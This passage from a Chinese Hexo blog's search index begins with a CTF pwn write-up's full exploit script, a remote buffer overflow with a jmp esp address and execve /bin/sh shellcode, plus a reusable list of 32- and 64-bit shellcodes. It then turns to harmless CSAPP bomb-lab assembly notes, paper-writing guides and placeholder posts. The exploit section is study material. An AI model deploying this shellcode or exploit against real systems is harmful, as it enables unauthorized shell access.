id="完整exp-1"><a href="#完整exp-1" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-variable">from</span> <span class="hljs-variable">pwn</span> <span class="hljs-keyword">import</span> <span class="hljs-operator">*</span><br><span class="hljs-comment">#from LibcSearcher import *</span><br><br><span class="hljs-variable">p</span><span class="hljs-operator">=</span><span class="hljs-title function_">remote</span>(<span class="hljs-string">&quot;vps1.blue-whale.me&quot;</span>,<span class="hljs-number">9992</span>)<br><span class="hljs-comment">#elf=ELF(&quot;./pwn&quot;)</span><br><br><span class="hljs-variable">shellcode</span> <span class="hljs-operator">=</span> <span class="hljs-variable">b</span><span class="hljs-string">&quot;<span class="hljs-char escape_">\x31</span>\xc0<span class="hljs-char escape_">\x50</span><span class="hljs-char escape_">\x68</span>\x6e\x2f<span class="hljs-char escape_">\x73</span><span class="hljs-char escape_">\x68</span><span class="hljs-char escape_">\x68</span>\x2f\x2f<span class="hljs-char escape_">\x62</span><span class="hljs-char escape_">\x69</span><span class="hljs-char escape_">\x89</span>\xe3<span class="hljs-char escape_">\x50</span><span class="hljs-char escape_">\x89</span>\xe2<span class="hljs-char escape_">\x53</span><span class="hljs-char escape_">\x89</span>\xe1\xb0\x0b\xcd<span class="hljs-char escape_">\x80</span>&quot;</span><br><span class="hljs-variable">jmpesp</span><span class="hljs-operator">=</span><span class="hljs-number">0x08048667</span><br><span class="hljs-variable">payload</span><span class="hljs-operator">=</span><span class="hljs-variable">b</span>&#x27;<span class="hljs-variable">A</span>&#x27;<span class="hljs-operator">*</span>(<span class="hljs-number">0x1c</span><span class="hljs-operator">+</span><span class="hljs-number">4</span>)<span class="hljs-operator">+</span><span class="hljs-title function_">p32</span>(<span class="hljs-variable">jmpesp</span>)<span class="hljs-operator">+</span><span class="hljs-variable">shellcode</span><br><span class="hljs-variable">p</span>.<span class="hljs-property">sendlineafter</span>(<span class="hljs-string">&quot;input your name&quot;</span>,<span class="hljs-variable">payload</span>)<br><span class="hljs-variable">p</span>.<span class="hljs-property">interactive</span>()<br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>整理了一些shellcode:</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"># <span class="hljs-number">32</span>位 短字节shellcode <span class="hljs-comment">--&gt; 21字节</span><br>\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80<br><br># <span class="hljs-number">32</span>位 纯ascii字符shellcode<br>PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA<br><br># <span class="hljs-number">32</span>位 scanf可读取的shellcode<br>\xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff/bin/sh<br><br># <span class="hljs-number">64</span>位 scanf可读取的shellcode <span class="hljs-number">22</span>字节<br>\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05<br><br># <span class="hljs-number">64</span>位 较短的shellcode  <span class="hljs-number">23</span>字节<br>\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05<br><br># <span class="hljs-number">64</span>位 纯ascii字符shellcode<br>Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP——二进制炸弹——汇编指令积累</title>
    <link href="/2023/09/14/CSAPP%E2%80%94%E2%80%94%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%82%B8%E5%BC%B9%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E7%A7%AF%E7%B4%AF/"/>
    <url>/2023/09/14/CSAPP%E2%80%94%E2%80%94%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%82%B8%E5%BC%B9%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E7%A7%AF%E7%B4%AF/</url>
    
    <content type="html"><![CDATA[<h2 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3:"></a>phase_3:</h2><pre><code class="hljs">JG   ;有符号大于则跳转(前&gt;后)JA   ;无符号大于则跳转( “无符号”一词表示只能包含正数的变量。)je   ;相等跳转 (左操作数=右操作数)jmpq *0x402390(,%rax,8)   ;用于直接跳转到存储在的绝对地址 8 * %rax + 0x402390cmpl source dest   ;source&lt;dest则CF=1,否则CF=00x8 (%rsp)   ;表示“获取栈上距离栈指针 %rsp 8 个字节的位置，然后获取该地址处的值。lea eax，[addr]   ;将表达式addr的值放入eax寄存器</code></pre><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cmpl</span>   $<span class="hljs-number">0</span>x7,<span class="hljs-number">0</span>x8(%rsp)# 第一个数必须小于<span class="hljs-number">7</span>，否则爆炸<br><span class="hljs-attribute">ja</span>     <span class="hljs-number">400</span>fad# 引爆炸弹<br></code></pre></td></tr></table></figure><p>以上两句汇编等同于 if (*rsp+8) &gt; 7, 跳转到0x400fad， 因此第一个数必须不大于7。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">jmpq</span> *<span class="hljs-number">0</span>x402470(,%rax,<span class="hljs-number">8</span>)<br></code></pre></td></tr></table></figure><p>是一个间接跳转指令, 可以看出这段代码是典型的switch语句，跳转表就存在于0x402470。%rax取值为[0, 7]，代表switch语句中8条不同的case。</p><h2 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4:"></a>phase_4:</h2><pre><code class="hljs">    Test   ;普遍的用法是用来测试一方寄存器是否为空：</code></pre><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">test </span>ecx, ecx<br>jz somewhere<br></code></pre></td></tr></table></figure><p>如果ecx为零，设置ZF零标志为1，jz跳转。</p><pre><code class="hljs">    JBE命令时，如果此时的CF标志位或者ZF标志位为1，跳转，其他不跳转    SHR   ;（右移）指令使目的操作数逻辑右移一位，最高位用 0 填充。    SAR   ;（算术右移）指令将目的操作数进行算术右移：    lea (%rax,%rsi,1),%ecx   ;作用是ecx=rax+rsi*1    cmp %edi,%ecx     jle 400ff2      ;若ecx≤edi，则跳转到400ff2    cmp %edi,%ecx    jge 401007     ；若ecx≥edi，则跳转到401007</code></pre><h2 id="Phase-5"><a href="#Phase-5" class="headerlink" title="Phase_5"></a>Phase_5</h2><pre><code class="hljs">    xor eax,eax</code></pre><p>eax异或eax，相同为0，并把结果存放到eax，简单说该语句就是想eax寄存器清零。<br></p><p><strong>windows x64寄存器命名规则</strong></p><pre><code class="hljs">    前缀R    表示64位寄存器。例如RAX。    前缀E    表示32位寄存器。例如EAX    后缀L    表示寄存器的低8位    后缀H    表示寄存器的9~16位</code></pre><p><img src="https://github.com/xhsy0314/Task/assets/84487619/86dfc5a1-ba28-4d9a-902e-75206d2d355c"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>系统论文——How (and How Not) to Write a Good Systems Paper</title>
    <link href="/2023/09/14/%E7%B3%BB%E7%BB%9F%E8%AE%BA%E6%96%87%E2%80%94%E2%80%94How-and-How-Not-to-Write-a-Good-Systems-Paper/"/>
    <url>/2023/09/14/%E7%B3%BB%E7%BB%9F%E8%AE%BA%E6%96%87%E2%80%94%E2%80%94How-and-How-Not-to-Write-a-Good-Systems-Paper/</url>
    
    <content type="html"><![CDATA[<h1 id="How-and-How-Not-to-Write-a-Good-Systems-Paper"><a href="#How-and-How-Not-to-Write-a-Good-Systems-Paper" class="headerlink" title="How (and How Not) to Write a Good Systems Paper"></a>How (and How Not) to Write a Good Systems Paper</h1><p><strong>论文类别</strong>:</p><ul><li>它通过对整个系统的全球调查或通过对系统中具体主题的选择性审查，呈现了一个真实的系统。</li><li>它提供了一个未实现的系统，但使用了您认为技术社区应该知道的想法或技术。</li><li>它涉及理论领域的一个主题，例如性能建模或安全验证。</li></ul><p><strong>系统论文写作30问</strong>:</p><ul><li>论文中的想法是新的吗？</li><li>你怎么知道该想法是不是新的？</li><li>能简明扼要地陈述这个新想法吗？</li><li>问题究竟在解决什么？</li><li>这些想法是否足以证明一篇论文的合理性？</li><li>所描述的工作是否与现有工作有显著不同？</li><li>是否引用了所有相关工作，并且实际阅读了引用材料？</li><li>与以前工作的比较是否清晰明确？</li><li>工作是否包括重要的扩展、验证或否定早期但未经证实的想法？</li><li>引用的最早的和最新的论文是什么？</li></ul><hr><ul><li>这篇论文是否描述了一些实际上已经存在的东西？</li><li>如果系统已经实施，如何使用它，以及这种用法是否表明了这些想法的实际重要性？</li><li>如果这个系统还没有实施，那么这些想法现在是否值得发表？</li></ul><hr><ul><li>你从工作中学到了什么？</li><li>读者应该从论文中学到什么？</li><li>这些经验教训的普遍适用性如何？</li></ul><hr><ul><li>在不同点考虑了哪些替代方案，为什么会做出这样的选择？</li><li>这些选择被证明是正确的吗？</li></ul><hr><ul><li>这项工作所基于的假设是什么？</li><li>这些假设现实吗？</li><li>工作对这些假设的扰动有多敏感？</li><li>如果提出一个正式的模型，它会提供新的信息和见解吗？</li></ul><hr><ul><li>介绍材料中是否包含与您主要开发所不相关的描述？</li><li>是否从以前出版的作品中包含了足够的材料，使你的读者能够遵循你的论点？</li></ul><hr><ul><li>这些想法是否以清晰和合乎逻辑的方式组织和呈现？</li><li>术语在使用之前是否定义？</li><li>前向引用是否保持在最低限度？（避免出现大量 “稍后将详细描述XXX（一个陌生术语）……”）</li><li>是否考虑了替代组织？（对这一点不太理解）</li><li>是先写的摘要吗？它传达了论文的重要思想吗？</li><li>论文写完了吗？</li></ul><hr><ul><li>文字是否清晰简洁？</li><li>单词的拼写和使用是否正确？</li><li>句子是否完整且语法正确？</li><li>是否避免歧义、俚语和口语化？</li></ul><hr><p>原文链接：<a href="https://www.usenix.org/legacy/events/samples/submit/advice.html">https://www.usenix.org/legacy/events/samples/submit/advice.html</a> </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>文献综述——The structure of paperreport in Systems</title>
    <link href="/2023/09/14/%E6%96%87%E7%8C%AE%E7%BB%BC%E8%BF%B0%E2%80%94%E2%80%94The-structure-of-paperreport-in-Systems/"/>
    <url>/2023/09/14/%E6%96%87%E7%8C%AE%E7%BB%BC%E8%BF%B0%E2%80%94%E2%80%94The-structure-of-paperreport-in-Systems/</url>
    
    <content type="html"><![CDATA[<h1 id="The-structure-of-paperreport-in-Systems"><a href="#The-structure-of-paperreport-in-Systems" class="headerlink" title="The structure of paperreport in Systems"></a>The structure of paperreport in Systems</h1><p>some rules：</p><ul><li>1.在每个部分中，第一段应该是本节的摘要&#x2F;概述。可以先说：“在本节中，我们将介绍……”</li><li>2.在每个段落中，第一行（或第二行）应该对应于段落的摘要。</li><li>3.自上而下：从高层次开始，从高层次开始慢慢增加细节。</li><li>4.总长度：~15 页。</li></ul><p><strong>摘要</strong>[1段200-300字]</p><p>1-2行：本文的目标<br>1-2行：工作的动机和重要性<br>1-2行：结合我们工作的结果或贡献 <em>[尽量引用直观或易于解释的指标的数字来量化你的主张]</em></p><p><strong>引言</strong> [1-1.5页]</p><ul><li>(1段)问题是什么，动机，重要性，主要贡献</li><li>(1段)问题：高层次的定义，意义</li><li>(1段)以前的工作[每篇相关论文最多一行，为下一节留下详细信息]</li><li>(1段)我们的贡献：可能的结果和贡献</li><li>“本文的其余部分结构如下。在第 2 节中,…..”</li></ul><p><strong>背景和模型</strong> [1-1.5 页]</p><ul><li>(1段)定义、场景、模型</li><li>(1段)以前的工作 [仅当这有助于显示出自己的工作是不同的或更好的时才提供详细信息。]</li><li>(1段)以前工作的弱点或你提出的东西的缺点</li><li>(1段)工作的假设和局限性。[诚实，但不要谴责你的工作]。</li></ul><p><strong>我们的想法</strong> [根据需要]</p><ul><li>(1段)创新点概述</li><li>(多段)它是什么以及它是如何工作的</li><li>(多段) 解释细节</li></ul><p><strong>分析</strong> [根据需要]</p><ul><li>(1段)在本节中证明的内容概述</li><li>(1段)特定于分析的定义 [将在证明中使用的图形结构]</li><li>(多段)分析 - 证明</li><li>(1段)注释 - 直观或实用层面的证明的含义</li></ul><p><strong>实验结果</strong> [根据需要]</p><ul><li>(1段)实验概述：我们做什么，我们不做什么，为什么</li><li>(1段)模拟模型或测量基础设施</li><li>(多段)实验结果<ul><li>使用标题（粗体）区分实验</li><li>每个图都应该有一个明确的出现原因</li><li>解释每个图： 轴，我们看到的，趋势是什么，为什么这是趋势</li><li>统计注释将加强您的结果：置信区间，相关系数等。</li><li>每个数字应该是独立且不言自明：标题应该是可读的，并且可理解的。</li><li>评论，讨论，解释</li></ul></li></ul><p><strong>讨论</strong> [1-2 页]<br><br>可以通过以下方式加强工作的重要性：<br>  <em>a）重要性 b）与其他作品的关系 c）可能的实际应用</em></p><br><p><strong>结论</strong> [1-1.5]<br><br>[结论非常重要。不要指望读者记得你告诉他&#x2F;她的一切。]</p><ul><li>(1段)概述这项工作的内容。</li><li>(1段)主要成果和贡献</li><li>(1段)对重要性的评论或实际使用的技巧 [您的结果或经验如何在实践中帮助某人或另一位研究人员使用您的模拟器或避免陷阱]</li><li>(1段)未来工作。强调工作的重要性，但避免发表你的想法]。</li></ul><p><strong>参考文献</strong><br><br>[必须正确、完整、准确]<br></p><p><strong>附录</strong>[根据需要]<br><br>附录可以写任何想写的东西：审稿人没有义务通读它们。建议用途：</p><pre><code class="hljs">a）提供额外的结果，以加强您的论点，但不重要b）通过在此处放置冗长的证明或讨论细节来保持论文的流畅性c）解决一个表明你已经深入思考过这个问题的问题</code></pre><p>原文链接：<a href="http://www.cs.ucr.edu/~michalis/TECHWRITING/structure.html">http://www.cs.ucr.edu/~michalis/TECHWRITING/structure.html</a> —— <em>Michalis Faloutsos U.C. Riverside</em></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>first article</title>
    <link href="/2023/09/13/first-article/"/>
    <url>/2023/09/13/first-article/</url>
    
    <content type="html"><![CDATA[<h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><p>代码测试：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;Hello&quot;</span>)</span></span><br></code></pre></td></tr></table></figure><p>图片测试：</p><p><img src="http://mculover666.cn/blog/20191031/R4mWMXsrRKxu.png?imageslim"></p><p>引用测试：</p><blockquote><p>这是一条引用</p></blockquote><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><p>无序列表测试：</p><ul><li>哈哈</li><li>嘿嘿</li><li>吼吼</li></ul><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/09/13/hello-world/"/>
    <url>/2023/09/13/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
